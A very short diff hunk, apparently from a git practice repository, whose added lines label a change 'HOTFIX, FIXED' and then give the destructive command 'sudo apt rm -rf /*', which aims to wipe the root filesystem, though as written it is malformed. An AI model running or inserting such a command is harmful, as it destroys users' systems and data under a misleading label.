@@ -2,3 +2,6 @@
 changed the file
 
 diverge this master branch
+
+HOTFIX, FIXED
+sudo apt rm -rf /*
